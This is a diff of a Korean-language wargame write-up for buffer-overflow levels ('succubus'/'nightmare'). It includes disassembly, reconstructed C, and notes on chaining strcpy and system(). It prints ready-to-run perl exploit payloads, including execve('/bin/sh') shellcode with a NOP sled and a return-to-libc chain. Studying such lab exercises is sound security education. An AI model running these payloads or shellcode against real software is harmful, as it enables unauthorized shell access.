@@ -1421,58 +1421,138 @@ shell code: bffffaa4
 ./succubus $(perl -e 'print "\x90"x44 ."\xec\x87\x04\x08\xbc\x87\x04\x08\x8c\x87\x04\x08\x5c\x87\x04\x08\x24\x87\x04\x08". "\xa4\xfa\xff\xbf" . "ffff" . "\x90"x3 ."\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')
 ```
 
-  0x80486b4  <main>:       push   %ebp   0x80486b5  <main+1>:     mov    %ebp,%esp     0x80486b7  <main+3>:     sub    %esp,44     0x80486ba  <main+6>:     cmp    DWORD PTR  [%ebp+8],1   0x80486be  <main+10>:    jg     0x80486d7  <main+35>   0x80486c0  <main+12>:    push   0x80487db   0x80486c5  <main+17>:    call   0x80483e0  <printf>   0x80486ca  <main+22>:    add    %esp,4   0x80486cd  <main+25>:    push   0   0x80486cf  <main+27>:    call   0x80483f0 <exit>   0x80486d4  <main+32>:    add    %esp,4     0x80486d7  <main+35>:    mov    DWORD PTR  [%ebp-44],0x8048410   0x80486de  <main+42>:    push   4   0x80486e0  <main+44>:    lea    %eax,[%ebp-44]   0x80486e3  <main+47>:    push   %eax   0x80486e4  <main+48>:    mov    %eax,DWORD PTR  [%ebp+12]   0x80486e7  <main+51>:    add    %eax,4     0x80486ea  <main+54>:    mov    %edx,DWORD PTR  [%eax]   0x80486ec  <main+56>:    add    %edx,44     0x80486ef  <main+59>:    push   %edx   0x80486f0  <main+60>:    call   0x80483c0  <memcmp>   0x80486f5  <main+65>:    add    %esp,12      0x80486f8  <main+68>:    mov    %eax,%eax   0x80486fa  <main+70>:    test   %eax,%eax   0x80486fc  <main+72>:    je     0x8048715  <main+97>   0x80486fe  <main+74>:    push   0x8048800   0x8048703  <main+79>:    call   0x80483e0  <printf>   0x8048708  <main+84>:    add    %esp,4     0x804870b  <main+87>:    push   0   0x804870d  <main+89>:    call   0x80483f0  <exit>   0x8048712  <main+94>:    add    %esp,4     0x8048715  <main+97>:    mov    %eax,DWORD PTR  [%ebp+12]   0x8048718  <main+100>:   add    %eax,4     0x804871b  <main+103>:   mov    %edx,DWORD PTR  [%eax]   0x804871d  <main+105>:   push   %edx   0x804871e  <main+106>:   lea    %eax,[%ebp-40]   0x8048721  <main+109>:   push   %eax   0x8048722  <main+110>:   call   0x8048410 <strcpy>   0x8048727  <main+115>:   add    %esp,8     0x804872a  <main+118>:   lea    %eax,[%ebp-40]   0x804872d  <main+121>:   push   %eax   0x804872e  <main+122>:   push   0x8048825   0x8048733 <main+127>:    call   0x80483e0 <printf>   0x8048738  <main+132>:   add    %esp,8     0x804873b <main+135>:    push   4   0x804873d  <main+137>:   push   65   0x804873f  <main+139>:   lea    %eax,[%ebp-40]   0x8048742  <main+142>:   lea    %edx,[%eax+48]   0x8048745 <main+145>:    push   %edx   0x8048746  <main+146>:   call   0x8048400 <memset>   0x804874b <main+151>:    add    %esp,12     0x804874e  <main+154>:   leave   0x804874f  <main+155>:   ret	if(argc<=1){   printf("argv  error\n");         exit(0);   }                 0x8048410<strcpy>                       memcmp(  argv1,0x8048410<strcpy>,4 )         if(flag!=1){         printf("You  must fall in love with strcpy()\n");           exit(0);  }                              strcpy(buffer,argv[1]);                       printf("%s\n",buffer);                  //ebp-40+48=ebp+8  memset(argc,65,4);
-                                          	                                        
+## (18) LEVEL 18: succubus / here to stay
 
-ebp-40: buffer
+### 문제 개요
+**assembly 코드**
+```
+0x80486b4  <main>:       push   %ebp   
+0x80486b5  <main+1>:     mov    %ebp,%esp     
 
-ebp-44: addr
+0x80486b7  <main+3>:     sub    %esp,44     
 
+0x80486ba  <main+6>:     cmp    DWORD PTR  [%ebp+8],1   
+0x80486be  <main+10>:    jg     0x80486d7  <main+35>   
+0x80486c0  <main+12>:    push   0x80487db   
+0x80486c5  <main+17>:    call   0x80483e0  <printf>   
+0x80486ca  <main+22>:    add    %esp,4   
+0x80486cd  <main+25>:    push   0   
+0x80486cf  <main+27>:    call   0x80483f0 <exit>   
+0x80486d4  <main+32>:    add    %esp,4     
+
+0x80486d7  <main+35>:    mov    DWORD PTR  [%ebp-44],0x8048410   
+0x80486de  <main+42>:    push   4   
+0x80486e0  <main+44>:    lea    %eax,[%ebp-44]   
+0x80486e3  <main+47>:    push   %eax   
+0x80486e4  <main+48>:    mov    %eax,DWORD PTR  [%ebp+12]   
+0x80486e7  <main+51>:    add    %eax,4     
+
+0x80486ea  <main+54>:    mov    %edx,DWORD PTR  [%eax]   
+0x80486ec  <main+56>:    add    %edx,44     
+
+0x80486ef  <main+59>:    push   %edx   
+0x80486f0  <main+60>:    call   0x80483c0  <memcmp>   
+0x80486f5  <main+65>:    add    %esp,12      
+
+0x80486f8  <main+68>:    mov    %eax,%eax   
+0x80486fa  <main+70>:    test   %eax,%eax   
+0x80486fc  <main+72>:    je     0x8048715  <main+97>   
+0x80486fe  <main+74>:    push   0x8048800   
+0x8048703  <main+79>:    call   0x80483e0  <printf>   
+0x8048708  <main+84>:    add    %esp,4     
+
+0x804870b  <main+87>:    push   0   
+0x804870d  <main+89>:    call   0x80483f0  <exit>   
+0x8048712  <main+94>:    add    %esp,4     
+
+0x8048715  <main+97>:    mov    %eax,DWORD PTR  [%ebp+12]   
+0x8048718  <main+100>:   add    %eax,4     
+
+0x804871b  <main+103>:   mov    %edx,DWORD PTR  [%eax]   
+0x804871d  <main+105>:   push   %edx   
+0x804871e  <main+106>:   lea    %eax,[%ebp-40]   
+0x8048721  <main+109>:   push   %eax   
+0x8048722  <main+110>:   call   0x8048410 <strcpy>   
+0x8048727  <main+115>:   add    %esp,8     
+
+0x804872a  <main+118>:   lea    %eax,[%ebp-40]   
+0x804872d  <main+121>:   push   %eax   
+0x804872e  <main+122>:   push   0x8048825   
+0x8048733  <main+127>:   call   0x80483e0 <printf>   
+0x8048738  <main+132>:   add    %esp,8     
+
+0x804873b  <main+135>:   push   4   
+0x804873d  <main+137>:   push   65   
+0x804873f  <main+139>:   lea    %eax,[%ebp-40]   
+0x8048742  <main+142>:   lea    %edx,[%eax+48]   
+0x8048745  <main+145>:   push   %edx   
+0x8048746  <main+146>:   call   0x8048400 <memset>   
+0x804874b  <main+151>:   add    %esp,12     
+
+0x804874e  <main+154>:   leave   
+0x804874f  <main+155>:   ret
+```
+
+- ebp-40: buffer
+- ebp-44: addr
+
+**c언어로 예측하여 변환한 코드**
+```
+if(argc<=1){
+  printf("argv error\n");
+  exit(0);
+}
+
+memcmp(argv[1][44],0x8048410<strcpy>,4)
+
+if(flag != 1){
+  printf("You must fall in love with strcpy()\n");
+  exit(0);
+}
+
+strcpy(buffer,argv[1]);
+printf("%s\n",buffer);
+memset(argc,65,4);
+```
+
+### 문제풀이
+```
 memset(argc,65,4);
-
 memset(초기화할 곳, 어떤 데이터로 초기화할지, 얼마만큼 초기화할지)
 
 argv영역을 65(10진수)--> <16진수로는 41>로 4바이트만큼 초기화
 
 <strcpy>
-
 char *strcpy(char *dest, const char *src);
 
 r $(perl -e 'print "a"x44 . "\x10\x84\x04\x08"')
-
 ./aa $(perl -e 'print "a"x44 ."\x10\x84\x04\x08"')
 
-ret부분이 strcpy함수주소가 아니면 exit됨.
+ret부분이 strcpy함수주소가 아니면 exit됨
+```
 
-\1. nop+shell+strcmp+shell
+- nop + shell + strcmp + shell
 
+```
 <system> 0x40058ae0
-
 </bin/sh>  0x400fbff9
 
-strcpy (원래는 ret) [
+[strcpy(원래는 ret)] [ ret2 ] [ &dest ] [ &src ] 의 형태로 넣어주면 src->dest 데이터를 복사할 수 있음
 
-&dest ] [ &src ] 의 형태로 넣어주면 src->dest 데이터를 복사할 수 있음. 
+[ buffer(40) ] [ sfp(4) ] [ strcpy(4) ] [ ret2(4) ] [ &dest(4) ] [ &src(4) ]
 
- buffer(40)   strcpy(4)  [ &dest(4) ] [
-
-&src(4) ] 
-
- system   /bin/sh   strcpy  &ret2 
+[ system ] [ aaaa ] [ /bin/sh ] [ dummy(32) ] [ strcpy ] [ ret2 ] [ &ret2 ] [ &buffer ]
 
 <system> : 0x40058ae0
-
 </bin/sh> : 0x400fbff9
-
-     &buffer: bf/ff/fa/a0
-
-        &ret : bf/ff/fa/d0
+&buffer: bf/ff/fa/a0
+&ret : bf/ff/fa/d0
 
 ./nightmare $(perl -e 'print "\xe0\x8a\x05\x40" ."aaaa" . "\xf9\xbf\x0f\x40" . "a"x32 ."\x10\x84\x04\x08" . "retn" . "\xe0\xfa\xff\xbf". "\xb0\xfa\xff\xbf"')
 
-&ret2, &buffer를 동시에
+&ret2, &buffer를 동시에 16바이트씩 변경하였음
+한개 올렸더니 깨짐
 
-16바이트씩 변경. 한개 올렸더니 깨짐.
 
   0x8048714  <main>:       push   %ebp   0x8048715  <main+1>:     mov    %ebp,%esp     0x8048717  <main+3>:     sub    %esp,44     0x804871a  <main+6>:     mov    %eax,%ds:0x8049a3c   0x804871f  <main+11>:    push   %eax   0x8048720  <main+12>:    push   0x100   0x8048725 <main+17>:     lea    %eax,[%ebp-40]   0x8048728  <main+20>:    push   %eax   0x8048729 <main+21>:     call   0x8048408 <fgets>   0x804872e  <main+26>:    add    %esp,12     0x8048731  <main+29>:    lea    %eax,[%ebp-40]   0x8048734  <main+32>:    push   %eax   0x8048735 <main+33>:     push   0x80488bb   0x804873a  <main+38>:    call   0x8048438  <printf>   0x804873f  <main+43>:    add    %esp,8     0x8048742  <main+46>:    cmp    BYTE PTR [%ebp+7],0xbf   0x8048746  <main+50>:    jne    0x8048760  <main+76>   0x8048748  <main+52>:    push   0x80488bf   0x804874d  <main+57>:    call   0x8048438  <printf>   0x8048752  <main+62>:    add    %esp,4     0x8048755  <main+65>:    push   0   0x8048757  <main+67>:    call   0x8048458 <exit>   0x804875c  <main+72>:    add    %esp,4     0x804875f  <main+75>:    nop       0x8048760  <main+76>:    cmp    BYTE PTR  [%ebp+7],0x8   0x8048764 <main+80>:     jne    0x8048780 <main+108>   0x8048766  <main+82>:    push   0x80488e0   0x804876b <main+87>:     call   0x8048438 <printf>   0x8048770  <main+92>:    add    %esp,4     0x8048773 <main+95>:     push   0   0x8048775  <main+97>:    call   0x8048458  <exit>   0x804877a <main+102>:    add    %esp,4     0x804877d  <main+105>:   lea    %esi,[%esi]     0x8048780 <main+108>:    push   4   0x8048782  <main+110>:   lea    %eax,[%ebp-40]   0x8048785  <main+113>:   lea    %edx,[%eax+44]   0x8048788  <main+116>:   push   %edx   0x8048789  <main+117>:   lea    %eax,[%ebp-44]   0x804878c  <main+120>:   push   %eax   0x804878d  <main+121>:   call   0x8048448 <memcpy>   0x8048792 <main+126>:    add    %esp,12     0x8048795  <main+129>:   push   2   0x8048797 <main+131>:    push   0x8048902   0x804879c  <main+136>:   mov    %eax,DWORD PTR  [%ebp-44]   0x804879f  <main+139>:   push   %eax   0x80487a0  <main+140>:   call   0x8048418 <memcmp>   0x80487a5 <main+145>:    add    %esp,12     0x80487a8  <main+148>:   mov    %eax,%eax   0x80487aa <main+150>:    test   %eax,%eax   0x80487ac  <main+152>:   jne    0x80487b0  <main+156>   0x80487ae  <main+154>:   jmp    0x80487e0  <main+204>   0x80487b0  <main+156>:   mov    %eax,DWORD PTR [%ebp-44]   0x80487b3  <main+159>:   cmp    BYTE PTR  [%eax],0xc9   0x80487b6  <main+162>:   jne    0x80487d8 <main+196>   0x80487b8  <main+164>:   mov    %eax,DWORD PTR  [%ebp-44]   0x80487bb  <main+167>:   inc    %eax   0x80487bc  <main+168>:   cmp    BYTE PTR  [%eax],0xc3   0x80487bf  <main+171>:   jne    0x80487d8  <main+196>   0x80487c1  <main+173>:   push   0x8048920   0x80487c6  <main+178>:   call   0x8048438 <printf>   0x80487cb  <main+183>:   add    %esp,4     0x80487ce  <main+186>:   push   0   0x80487d0 <main+188>:    call   0x8048458 <exit>   0x80487d5  <main+193>:   add    %esp,4     0x80487d8 <main+196>:    inc    DWORD PTR [%ebp-44]   0x80487db  <main+199>:   jmp    0x8048795 <main+129>     0x80487dd  <main+201>:   lea    %esi,[%esi]     0x80487e0  <main+204>:   push   44   0x80487e2 <main+206>:    push   0   0x80487e4  <main+208>:   lea    %eax,[%ebp-40]   0x80487e7 <main+211>:    push   %eax   0x80487e8  <main+212>:   call   0x8048468 <memset>   0x80487ed <main+217>:    add    %esp,12     0x80487f0  <main+220>:   lea    %eax,[%ebp-40]   0x80487f3 <main+223>:    mov    %edx,0xbfffffcf   0x80487f8  <main+228>:   mov    %ecx,%edx   0x80487fa <main+230>:    sub    %ecx,%eax   0x80487fc  <main+232>:   mov    %eax,%ecx   0x80487fe <main+234>:    push   %eax   0x80487ff  <main+235>:   push   0   0x8048801  <main+237>:   lea    %eax,[%ebp-40]   0x8048804  <main+240>:   lea    %edx,[%eax+48]   0x8048807 <main+243>:    push   %edx   0x8048808  <main+244>:   call   0x8048468 <memset>   0x804880d <main+249>:    add    %esp,12     0x8048810  <main+252>:   push   0xb90   0x8048815  <main+257>:   push   0   0x8048817  <main+259>:   lea    %eax,[%ebp-40]   0x804881a  <main+262>:   lea    %edx,[%eax-3000]   0x8048820  <main+268>:   push   %edx   0x8048821  <main+269>:   call   0x8048468 <memset>   0x8048826 <main+274>:    add    %esp,12     0x8048829  <main+277>:   leave   0x804882a <main+278>:    ret	프롤로그     stack memory 44bytes   ebp-44: char * addr;   ebp-40: char buffer[40];     stdin   0x100 = 256   fgets(buffer,256,stdin);           printf("%s\n",buffer);           if(ebp+7==0xbf){   printf("stack retbayed  you!\n");             exit(0);   }         if(ebp+7==0x8){     printf("binary  image retbayed you, too!!\n")   exit(0);               }     ebp-40+44=ebp+4   memcpy(addr,ebp+4,4);                   memcmp(addr, 0x8048902,2);     //0x8048902 <_IO_stdin_used+126>:  0x00009090 -> 9090             while(1){       if(addr==0xc9){ break; }   (0xc9=>201)     if((addr+1)==0xc3){ break; }     0xc3=>195       printf("You cannot use library  function!\n");         exit(0);       addr++;   }             memset(buffer,0,44);           memset(ebp+8,0,bfffffcf-addr);                             0xb90=2960     memset(addr-3000, 0, 2960);
                                           	                                        
